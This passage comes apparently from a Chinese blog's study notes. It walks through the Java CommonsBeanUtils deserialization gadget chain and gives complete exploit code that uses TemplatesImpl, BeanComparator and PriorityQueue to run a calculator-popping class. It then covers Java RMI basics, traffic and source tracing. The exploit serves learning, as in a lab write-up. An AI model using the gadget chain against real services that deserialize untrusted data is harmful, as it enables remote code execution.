<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.9.2&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;3.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-logging&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.2&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h4 id="CommonsBeanUtils介绍"><a href="#CommonsBeanUtils介绍" class="headerlink" title="CommonsBeanUtils介绍"></a>CommonsBeanUtils介绍</h4><p><strong>CommonsBeanUtils</strong>是一个Apache库里的工具，用来简化对 <strong>Java Bean</strong> 的操作，比如</p>
<ul>
<li>反射获取类的属性</li>
<li>动态设置属性值</li>
<li>类型转换</li>
<li>Bean 之间的属性拷贝</li>
</ul>
<p><a class="link"   href="https://liaoxuefeng.com/books/java/oop/core/javabean/index.html" >Java Bean介绍文章<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>Java Bean</strong> 是符合特定规范的 Java 类，主要用于封装数据。其核心特征包括：</p>
<ul>
<li>必须有无参构造方法（可通过默认构造器或显式定义）。</li>
<li>属性私有化（<code>private</code> 修饰），通过公共的 <code>getter</code> 和 <code>setter</code> 方法访问。可以利用IDE快速生成<code>getter</code>和<code>setter</code></li>
<li>可序列化（实现 <code>Serializable</code> 接口，非强制但常见）。</li>
</ul>
<p>写一个JavaBean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;&#125; <span class="comment">// 无参构造</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例写一个User类，然后用Commons-BeanUtils 的<code>PropertyUtils.getProperty</code>静态方法，让使用者可以直接调用任意 JavaBean 的 getter 方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227194204.png" ></p>
<p><code>PropertyUtils.getProperty()</code>传入两个参数，第一个参数为 JavaBean 实例，第二个是 JavaBean 的属性，刚刚的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(user, &quot;name&quot;);</span><br><span class="line">=</span><br><span class="line">user.getName(&quot;Flow&quot;);</span><br></pre></td></tr></table></figure>

<p>PropertyUtils.getProperty&#96; 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过PropertyUtils.getProperty(a,”b.c”); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter</p>
<p>除了这个CommonsBeanUtils还有很多方法可以对JavaBean进行操作，等后续再接触</p>
<h4 id="CommonsBeanUtils链分析"><a href="#CommonsBeanUtils链分析" class="headerlink" title="CommonsBeanUtils链分析"></a>CommonsBeanUtils链分析</h4><p>已知这条链子最后用的是恶意类加载，之前用到的链子尾部是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">  -&gt;TemplatesImpl#newTransformer()</span><br><span class="line">    -&gt; TemplatesImpl#getTransletInstance()</span><br><span class="line">      -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">        -&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p>说是<code>getOutputProperties</code>算是一个getter方法，问了一下GPT，确实都符合条件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227201901.png" ></p>
<blockquote>
<p>在 <strong>JavaBean规范</strong> 中，getter 方法的特点是：</p>
<p>1.<strong>方法名以</strong> get <strong>开头</strong>（或者对于 boolean 类型是 is 开头）。</p>
<p>2.<strong>后面跟着属性名的首字母大写版本</strong>。</p>
<p>3.<strong>必须是</strong> public <strong>访问权限</strong>。</p>
<p>4.<strong>返回一个属性的值</strong>。</p>
</blockquote>
<p>所以我们可以用<code>PropertyUtils.getProperty()</code>获取到，大概长这样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>那现在看谁调用了<code>PropertyUtils.getProperty()</code>，找到一个<code>BeanComparator.compare()</code>，说到compare就熟了，前面CC4接触过，那就接上了！画了个图，看起来就是殊途同归</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227204042.png" ></p>
<h4 id="CommonsBeanUtils链EXP编写"><a href="#CommonsBeanUtils链EXP编写" class="headerlink" title="CommonsBeanUtils链EXP编写"></a>CommonsBeanUtils链EXP编写</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">    <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">    beanComparator.setProperty(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>卡在这里，在思考要怎么把templates作为o1传入compare，这里可以先运行尝试一下，因为<code>PriorityQueue.add()</code>会自动跳到compare，顺着到链子后部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(templates);</span><br><span class="line">priorityQueue.add(templates);</span><br></pre></td></tr></table></figure>

<p>这样执行会弹出计算机</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250228001450.png" ></p>
<p>因为BeanComparator刚好有<code>setProperty</code>方法，经过测试，下面这两句效果一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beanComparator.setProperty(&quot;outputProperties&quot;);</span><br><span class="line">setFieldValue(beanComparator,&quot;property&quot;,&quot;outputProperties&quot;);</span><br></pre></td></tr></table></figure>

<p>我们的目的是只在反序列化的时候才弹计算机，所以现在先add两个不会触发恶意类加载的值</p>
<p>这个时候 <code>beanComparator.setProperty(&quot;outputProperties&quot;);</code>这句要注释掉，不然add过程中走到compare()会报错，可以看调试的时候，o1是个整形，他么得 <code>outputProperties</code>，自然会报错，所以这一句要挪到add后</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250228003345.png" ></p>
<p>add后再用反射给priorityQueue的queue传入templates，设置BeanComparator.compare()的参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setFieldValue(priorityQueue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;);</span><br></pre></td></tr></table></figure>

<p>最后的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line"><span class="comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;); <span class="comment">// 设置BeanComparator.compare()的参数</span></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>); </span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h4><p>这条链其实不难找，在尝试自己写的时候有点狭隘，感觉对队列这个数据结构不熟悉也是，有些地方钻了牛角尖</p>
<ul>
<li>执行beanComparator的property反射修改在add前还是add后这里调了些时间</li>
<li>反射修改里面的new Object[]{templates, templates}，亲测第一个对象一定要是templates，第二个对象可以随便</li>
</ul>
<p>记录一下过程中的纠结以后回头看可能会有新的感谢，以上有任何不对的欢迎找我指正🙏</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link"   href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" >https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/1vxyz/p/17588722.html" >https://www.cnblogs.com/1vxyz/p/17588722.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-RMI学习</title>
    <url>/2025/04/02/Java-RMI%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>我看后面挺多漏洞和这个RMI和JNDI有关，现在先学习一下</p>
<h4 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h4><p>RMI 全称 Remote Method Invocation（远程方法调用），在一个 JVM 中 Java 程序调用在另一个远程 JVM 中运行的 Java 程序，这个远程 JVM 既可以在同一台实体机上，也可以在不同的实体机上，两者之间通过网络进行通信。</p>
<p>RMI 依赖的<strong>通信协议</strong>为 JRMP(Java Remote Message Protocol，Java 远程消息交换协议)，该协议为 Java 定制，要求服务端与客户端都为 Java 编写。</p>
<h5 id="RMI三个部分"><a href="#RMI三个部分" class="headerlink" title="RMI三个部分"></a>RMI三个部分</h5><ul>
<li>服务端：提供服务</li>
<li>客户端：调用服务端端服务</li>
<li>注册端：提供服务注册与服务获取，客户端可以在这里查询要调用的方法的引用</li>
</ul>
<p>交互过程（图源 <a class="link"   href="https://fynch3r.github.io/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/%EF%BC%89" >https://fynch3r.github.io/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/）<i class="fas fa-external-link-alt"></i></a><br><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250303151048.png" ></p>
<p>在Java RMI里</p>
<ul>
<li>远程服务器实现具体的Java方法并提供接口</li>
<li>客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法</li>
<li>其中对象是通过<strong>序列化</strong>方式进行编码传输的</li>
<li>RMI全部的宗旨就是尽可能简化远程接口对象的使用</li>
</ul>
<h4 id="RMI实现"><a href="#RMI实现" class="headerlink" title="RMI实现"></a>RMI实现</h4><p>先写一个接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloService</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>写一个类继承这个接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;你好, &quot;</span> + name + <span class="string">&quot;! 这是来自RMI服务器的问候。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>服务端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 设置 RMI 服务器的 IP 地址</span></span><br><span class="line">            System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 创建服务实例</span></span><br><span class="line">            <span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloServiceImpl</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 创建并启动RMI注册表，监听1099端口</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 将服务绑定到注册表</span></span><br><span class="line">            registry.bind(<span class="string">&quot;HelloService&quot;</span>, helloService);</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;RMI服务器已启动在127.0.0.1:1099...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;RMI服务器异常：&quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>客户端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取RMI注册表</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 查找远程服务HelloService</span></span><br><span class="line">            <span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) registry.lookup(<span class="string">&quot;HelloService&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 调用远程方法</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> helloService.sayHello(<span class="string">&quot;FLOW&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;服务器响应：&quot;</span> + response);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;客户端异常：&quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>然后就能运行起来了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250303212732.png" ></p>
<p>这里有个特别坑的地方，在server的代码里面，绑定registry之前要设置好服务器ip，不然client连接的时候会报错，本身不是很熟悉这个东西，拷打gpt半天都没结局，最后换了cursor才解决的。。。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="从WireShark观察RMI通信过程"><a href="#从WireShark观察RMI通信过程" class="headerlink" title="从WireShark观察RMI通信过程"></a>从WireShark观察RMI通信过程</h4><p>wireshark开一个本地抓包，粗略看一眼就可以发现有很多RMI协议的包，当然前后的TCP包也要注意</p>
<p>可以看到这里<strong>25-27</strong>号包是在tcp三次握手建立连接的过程</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250304182910.png" ></p>
<p>建立连接之后数据端与注册中心建立通讯，1099是注册端，50140是客户端</p>
<p>建立TCP连接后开始请求调用，看到后面有一个CALL，数据包里面包含了要调用的远程函数名，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-04%2021.33.07.png" ></p>
<p>再往下看到ReturnData，返回了很多代理服务对象，是序列化的数据，可以看到序列化的魔术头，最后还看到一个新的端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-04%2021.35.30.png" ></p>
<p>c3b0 50096，指的是提供服务的端口</p>
<p>后面客户端（50141）新起一个端口和服务端（50096）建立连接，会看到建立了第二次TCP连接，有三个握手包</p>
<p>建立连接后继续发送序列化数据和我们要打印的数据</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-04%2021.41.01.png" ></p>
<p>红色和紫色分别代表客户端和服务端发送的数据，可以清晰地看到数据的来回传送</p>
<p>可以看到整个过程中数据流都是通过序列化传输的，那客户端和服务端必定有序列化反序列化的地方。</p>
<p>看完整个流量包过程再看会前面那张流程图就会清晰很多，推荐所有人都去动手做一下。</p>
<h4 id="从源码观察调用过程"><a href="#从源码观察调用过程" class="headerlink" title="从源码观察调用过程"></a>从源码观察调用过程</h4><h5 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h5><p>创建远程对象然后发布到网上，就已经可以通信了，我们要了解这是个什么样的过程</p>
<p>说是没什么server这个部分其实没什么漏洞，但是要了解一下过程</p>
<h6 id="创建服务并发布"><a href="#创建服务并发布" class="headerlink" title="创建服务并发布"></a>创建服务并发布</h6><p>为了跟着教程，这里我用Drunk师傅的代码调试，不知道为什么自己的idea跳不进去，我这里断点打在<code>RemoteObjectImpl</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250317234238.png" ></p>
<p><code>RemoteObjectImpl</code>是继承<code>UnicastRemoteObject</code>类（继承这个类是硬性要求。另一种写法是在下面的代码块写一段直接调用），所以会先到父类的构造函数，f7步进</p>
<p>跳到下图地方，可以看到给了一个port端口，一开始是0</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250317235155.png" ></p>
<p>再继续往下看，来到 <code>exportObject()</code>，就是这个函数负责把服务发步到网络，跟进去</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318000013.png" ></p>
<p>看到还套了一层，里面有一个<code>UnicastServerRef()</code>，这里在idea里直接点击UnicastServerRef，就会跳转到这个函数里面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318000151.png" ></p>
<p>有一个**<code>LiveRef</code>**，这个很重要，继续跟进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318000949.png" ></p>
<p>是一个构造函数，点this进去看看，构造函数如下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318001016.png" ></p>
<p>第一个参数是ID，第三个参数是true，主要是第二个参数，TCPEndpoint这个名字一听就是和网络请求有关的，构造参数是一个host一个port</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318001235.png" ></p>
<p>LiveRef构造函数点击this进去</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-18%2000.16.21.png" ></p>
<p>可以看到进行了赋值，host和port都在endpoint里面了，而这个endpoint在LiveRef里面，注意这些id，会发现整个过程处理的都是一个LiveRef</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-18%2000.17.36.png" ></p>
<p>以上完成了对<code>LiveRef</code>的建立，代码会回到前面</p>
<p>一直走，其中这一步把之前的<code>LiveRef</code>给ref，操作对象一直都是同一个</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318003347.png" ></p>
<p>跳到这里又调用了一个&#96;exportObect，继续跟进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318003553.png" ></p>
<p>一直跟到这里出现了stub，这个是在整个RMI一个很重要的东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318003646.png" ></p>
<p>在这里先放一张原理图</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318003830.png" ></p>
<p>RMI在服务端建立的时候，现在服务端新建一个stub，再把stub传给RMI registry，最后让RMI Client去获取stub</p>
<p>这个stub在后面一个createProxy的地方被创建，看名字就知道是创建代理，跟进去看一下</p>
<p>可以看到这里有一个判断，这里不会进入，先不管，后面接触了再理解</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323143451.png" ></p>
<p>然后到了后面就是创建动态代理，看一下里面的参数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323144026.png" ></p>
<p>第一个参数是一个AppClassLoader，第二个是个远程接口，第三个是个调用处理器，可以看到里面包裹的就是我们之前一直操作的Ref，始终处理的对象就是这一个。</p>
<p>创建完动态代理后出来，可以看到stub已经有内容，里面也带上了Ref</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323144307.png" ></p>
<p>再继续往后，看到代码在创建一个Target，我们把taget理解成一个总封装，把我们之前创建的有用的参数包起来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323144440.png" ></p>
<p>看一下构造函数里面怎么操作的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323150155.png" ></p>
<p>看里面的值，一直都是一个LiveRef</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323150329.png" ></p>
<p>一路步过跳出target，看到后面又进入一个exportObject()</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323150601.png" ></p>
<p>一路跟进，到后面发现进入到TCPTransport里面的exportObject()，一进来就看到里面一个listen()函数，这里相当于开始处理真正的网络请求</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323150730.png" ></p>
<p>跟到一定的地方会看到里面新建一个socket，等待连接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323151003.png" ></p>
<p>后面的thread里就去做完成连接之后的事，如果有连接，就会进入run</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323151430.png" ></p>
<p>后面还有一个地方给port赋值</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323151348.png" ></p>
<p>listen()主要就是开了一个socket，在整个流程里添加了port，这块内容记录在stub里面</p>
<h6 id="发布服务后的记录"><a href="#发布服务后的记录" class="headerlink" title="发布服务后的记录"></a>发布服务后的记录</h6><p>再继续一直跟，出现了两个put，RMI会把所有信息保存在两个table里，相当于一个记录作用吧，这块就不细看了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323152146.png" ></p>
<h6 id="服务端创建小结"><a href="#服务端创建小结" class="headerlink" title="服务端创建小结"></a>服务端创建小结</h6><p>思路还是比较清晰的，主要就是一直利用exportObject()包装对象，一直处理的对象也就是那个LiveRef，进行各种各样的封装赋值。顺便给了端口，开了socket。</p>
<p>完成之后还有一个记录，是保存在静态的HashMap里面的，Drunk师傅说当日志理解就可以了。</p>
<p>服务端自己创建远程服务整个过程不存在漏洞。</p>
<h5 id="创建注册端-绑定"><a href="#创建注册端-绑定" class="headerlink" title="创建注册端+绑定"></a>创建注册端+绑定</h5><p>创建注册端和服务端还有点像，本质上也是把服务发布到网上，这块过的快一点</p>
<h6 id="创建注册中心"><a href="#创建注册中心" class="headerlink" title="创建注册中心"></a>创建注册中心</h6><p>断点打在这里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323153603.png" ></p>
